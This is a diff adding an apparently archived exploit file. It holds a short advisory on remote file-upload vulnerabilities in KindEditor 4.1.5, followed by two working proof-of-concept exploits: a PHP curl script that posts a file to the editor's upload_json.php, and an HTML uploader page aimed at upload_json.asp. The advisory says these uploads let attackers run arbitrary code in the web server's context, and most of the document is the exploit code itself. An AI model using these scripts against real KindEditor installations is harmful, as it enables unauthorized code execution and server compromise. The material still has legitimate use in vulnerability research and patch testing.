@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/58431/info
+
+KindEditor is prone to multiple remote file-upload vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Attackers can exploit these issues to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.
+
+KindEditor 4.1.5 is vulnerable; other versions may also be affected. 
+
+<?php
+ 
+$uploadfile="KedAns.txt";
+$ch = curl_init("http://www.example.com/kindeditor/php/upload_json.php?dir=file");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+       array(&#039;imgFile&#039;=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+ 
+?>
+
+# KindEditor (ASP,ASP.NET,JSP,PHP) _JSON Uploader :
+--------------------------------------------------
+
+<html><head>
+<title>Uploader By KedAns-Dz</title>
+<script src="http://www.example.com/kindeditor/kindeditor-min.js"></script>
+<script>
+KindEditor.ready(function(K) {
+var uploadbutton = K.uploadbutton({
+button : K(&#039;#uploadButton&#039;)[0],
+fieldName : &#039;imgFile&#039;,
+url : &#039;http://www.example.com/kindeditor/php/upload_json.asp?dir=file&#039;,
+afterUpload : function(data) {
+if (data.error === 0) {
+var url = K.formatUrl(data.url, &#039;absolute&#039;);
+K(&#039;#url&#039;).val(url);}
+},
+});
+uploadbutton.fileBox.change(function(e) {
+uploadbutton.submit();
+});
+});
+</script></head><body>
+<div class="upload">
+<input class="ke-input-text" type="text" id="url" value="" readonly="readonly" />
+<input type="button" id="uploadButton" value="Upload" />
+</div>
+</body>
+</html>
